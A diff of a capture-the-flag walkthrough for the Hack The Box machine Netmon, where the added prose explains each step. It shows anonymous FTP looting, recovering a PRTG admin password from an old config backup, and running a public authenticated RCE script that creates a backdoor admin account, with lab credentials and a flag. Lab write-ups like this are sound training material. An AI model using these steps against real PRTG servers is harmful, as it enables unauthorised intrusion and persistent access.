@@ -1,3 +1,9 @@
+This is my write-up/walkthrough for [the Hack The Box machine, Netmon](https://app.hackthebox.com/machines/Netmon). It's a Windows machine, rated "Easy", with 10.10.10.152 as its IP address.
+
+![Alt text](/images/netmon/2022-02-23-hack-the-box-netmon-01.JPG "Netmon Info Card")
+
+I started with an nmap scan—
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ sudo nmap -sC -sV -A 10.10.10.152
@@ -65,12 +71,14 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 315.44 seconds
 ```
 
+—that told me I have port 21 (FTP), port 80 (HTTP), port 135 (RPC), port 139 (NetBIOS), and port 445 (SMB) to work with. Anonymous login is allowed for FTP, so my first instinct was to use that and see if it gets us somewhere.
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ ftp 10.10.10.152                                                                                                                                                                   130 ⨯
 Connected to 10.10.10.152.
 220 Microsoft FTP Service
-Name (10.10.10.152:kali): anonymous
+Name (10.10.10.152:thatvirdiguy): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password:
 230 User logged in.
@@ -122,10 +130,14 @@ ftp>
 e2780575a4614d4d503d3c171b023190
 ```
 
+And that was it! That got me the user flag already.
+
+It didn't look like FTP would get us the root flag, so I moved on to the next bit on my check list: SMB. Tried for both anonymous authentication and exploit a potential misconfiguration against the Administrator user—
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ smbclient -L 10.10.10.152                                                                                                                                                            1 ⨯
-Enter WORKGROUP\kali's password: 
+Enter WORKGROUP\thatvirdiguy's password: 
 session setup failed: NT_STATUS_ACCESS_DENIED
 
 ┌──(thatvirdiguy㉿kali)-[~]
@@ -133,6 +145,16 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 Enter WORKGROUP\Administrator's password: 
 session setup failed: NT_STATUS_LOGON_FAILURE
 ```
+
+—but it wasn't fruitful. 
+
+Next on the list was port 80, so I pointed my browser to http://10.10.10.152 to see what we are working with here.
+
+![Alt text](/images/jerry/2022-02-23-hack-the-box-netmon-02.JPG "PRTG")
+
+A quick google search led me [here](https://www.paessler.com/prtg), and got a breif overview of this network monitoring tool.
+
+Running a searchsploit for "prtg" gave some curious results—
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
@@ -147,6 +169,10 @@ PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                         
 ----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
+
+—but it looked like we needed authentication on the server to exploit the one I was interested in.
+
+It was time to do some more googling – which led me to [titanssystems's PRTG-Exploit](https://github.com/titanssystems/PRTG-Exploit). According to the readme, the exploit was valid for version before 20.1.55.1775 and since the box is running 18.1.37.13946, we should be able to get something from this. I wasn't sure what, but I decided to give it a shot anyhow.
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
@@ -209,110 +235,20 @@ licensehash :
 cpuload :  92%
 ```
 
-```
-┌──(thatvirdiguy㉿kali)-[~]
-└─$ sudo msfconsole
-                                                  
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
-%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
-%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
-%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
-%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
-%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
-%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%                                                                                                                
-%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%                                                                                                                
-%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%                                                                                                                
-%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%                                                                                                                
-%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %                                                                                                                
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%                                                                                                                
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%                                                                                                                
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                                                                                
-                                                                                                                                                                                             
+Interesting, but didn't really get me anywhere.
 
-       =[ metasploit v6.1.14-dev                          ]
-+ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
-+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
-+ -- --=[ 9 evasion                                       ]
+Since I needed the Login Name and Password for the NETMON, I started thinking in terms of exploiting perhaps a misconfiguration on the server. Looking up for the default credentials on an installation led me to [this](https://kb.paessler.com/en/topic/433-what-s-the-login-name-and-password-for-the-prtg-web-interface-how-do-i-change-it) Knowledge Base article over at their website, but prtgadmin:prtgadmin didn't work.
 
-Metasploit tip: Search can apply complex filters such as 
-search cve:2009 type:exploit, see all the filters 
-with help search
+I was lost.
 
-msf6 > search prtg 
-
-Matching Modules
-================
-
-   #  Name                                         Disclosure Date  Rank       Check  Description
-   -  ----                                         ---------------  ----       -----  -----------
-   0  exploit/windows/http/prtg_authenticated_rce  2018-06-25       excellent  Yes    PRTG Network Monitor Authenticated RCE
-
-
-Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/prtg_authenticated_rce
-
-msf6 > info 0
-
-       Name: PRTG Network Monitor Authenticated RCE
-     Module: exploit/windows/http/prtg_authenticated_rce
-   Platform: Windows
-       Arch: x86, x64
- Privileged: No
-    License: Metasploit Framework License (BSD)
-       Rank: Excellent
-  Disclosed: 2018-06-25
-
-Provided by:
-  Josh Berry <josh.berry@codewatch.org>
-  Julien Bedel <contact@julienbedel.com>
-
-Available targets:
-  Id  Name
-  --  ----
-  0   Automatic Targeting
-
-Check supported:
-  Yes
-
-Basic options:
-  Name            Current Setting  Required  Description
-  ----            ---------------  --------  -----------
-  ADMIN_PASSWORD  prtgadmin        yes       The password for the specified username
-  ADMIN_USERNAME  prtgadmin        yes       The username to authenticate as
-  Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
-  RHOSTS                           yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
-  RPORT           80               yes       The target port (TCP)
-  SSL             false            no        Negotiate SSL/TLS for outgoing connections
-  VHOST                            no        HTTP server virtual host
-
-Payload information:
-
-Description:
-  Notifications can be created by an authenticated user and can 
-  execute scripts when triggered. Due to a poorly validated input on 
-  the script name, it is possible to chain it with a user-supplied 
-  command allowing command execution under the context of privileged 
-  user. The module uses provided credentials to log in to the web 
-  interface, then creates and triggers a malicious notification to 
-  perform RCE using a Powershell payload. It may require a few tries 
-  to get a shell because notifications are queued up on the server. 
-  This vulnerability affects versions prior to 18.2.39. See references 
-  for more details about the vulnerability allowing RCE.
-
-References:
-  https://nvd.nist.gov/vuln/detail/CVE-2018-9276
-  https://www.codewatch.org/blog/?p=453
-
-msf6 >
-```
+At this point, FTP was, and had been so far, my only bet. I figured I'll look around again, not sure what I was looking for.
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ ftp 10.10.10.152
 Connected to 10.10.10.152.
 220 Microsoft FTP Service
-Name (10.10.10.152:kali): anonymous
+Name (10.10.10.152:thatvirdiguy): anonymous
 331 Anonymous access allowed, send identity (e-mail name) as password.
 Password:
 230 User logged in.
@@ -427,6 +363,8 @@ File may not have transferred correctly.
 ftp> 
 ```
 
+I downloaded a couple of configuration files. The files themselves were huge, but `grep`'ing for "prtg" narrowed each down to the bits I was intersted in. "`PRTG Configuration.old.bak`" was intriguing, in particular.
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ cat 'PRTG Configuration.old.bak' | grep -A2 -B2 -i prtg 
@@ -444,6 +382,14 @@ ftp>
 --
 ```
 
+I tried prtgadmin:PrTg@dmin2018 on the NETMON console, but that didn't get me in. How I eventually got in was pure luck, though now in hindsight, I can tell why what I did worked. When "PrTg@dmin2019" didn't work as the password, I started trying various modifications of it – "prtg@admin2018", "admin@prtg2018", etc. It was a complete shot in the dark until I put in "PrTg@dmin2019" and I got through.
+
+![Alt text](/images/netmon/2022-02-23-hack-the-box-netmon-03.JPG "Welcome")
+
+Why did it work? "`PRTG Configuration.old.bak`", as the name suggests, is an old configuration file. The idea is that the password was, perhaps, updated to keep up with the new year, considering this box's relase date is 2019. Or at least that's my theory.
+
+Now that we have the valid credentials for the NETMON, we can move on to exploit the "PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution" vulnerability from the searchsploit results. A quick google search led me to [chcx's PRTG-Network-Monitor-RCE](https://github.com/chcx/PRTG-Network-Monitor-RCE).
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ git clone https://github.com/chcx/PRTG-Network-Monitor-RCE.git                                                        
@@ -458,12 +404,15 @@ Receiving objects: 100% (9/9), 4.07 KiB | 1.36 MiB/s, done.
 ┌──(thatvirdiguy㉿kali)-[~/PRTG-Network-Monitor-RCE]
 └─$ ls
 prtg-exploit.sh  README.md
+```
 
-┌──(thatvirdiguy㉿kali)-[~/PRTG-Network-Monitor-RCE]
-└─$ chmod +x prtg-exploit.sh
+I needed the authenticated cookie for this one, as per the readme, which I got from the following:
 
+![Alt text](/images/netmon/2022-02-23-hack-the-box-netmon-04.JPG "Cookie")
+
+```
 ┌──(thatvirdiguy㉿kali)-[~/PRTG-Network-Monitor-RCE]
-└─$ ./prtg-exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=ezBGNTQyRERFLTVFQjktNDg3MC1BQTc1LTgwMEVENDRFNURGOH0%3D; _gat=1"
+└─$ ./prtg-exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=ezkzNDJGODUyLUFBQ0ItNEREMi1CNEYxLUNGM0IzQThGQTdENn0%3D; _gat=1"
 
 [+]#########################################################################[+] 
 [*] PRTG RCE script by M4LV0                                                [*] 
@@ -491,29 +440,8 @@ prtg-exploit.sh  README.md
  [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 
  
 ```
- 
-```
-┌──(thatvirdiguy㉿kali)-[~]
-└─$ smbclient -L 10.10.10.152 -U pentest        
-Enter WORKGROUP\pentest's password: 
 
-        Sharename       Type      Comment
-        ---------       ----      -------
-        ADMIN$          Disk      Remote Admin
-        C$              Disk      Default share
-        IPC$            IPC       Remote IPC
-Reconnecting with SMB1 for workgroup listing.
-do_connect: Connection to 10.10.10.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
-Unable to connect with SMB1 -- no workgroup available
-                                                                                                                                                                                             
-┌──(thatvirdiguy㉿kali)-[~]
-└─$ smbclient -N \\\\10.10.10.152\\ADMIN$ -U pentest
-session setup failed: NT_STATUS_LOGON_FAILURE
-                                                                                                                                                                                             
-┌──(thatvirdiguy㉿kali)-[~]
-└─$ smbclient -N \\\\10.10.10.152\\ADMIN$ -U DOMAIN/pentest                                                                                                                              1 ⨯
-session setup failed: NT_STATUS_LOGON_FAILURE
-```
+Next was to use Impacket and these credentials to get a reverse shell on my machine.
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~/impacket/examples]
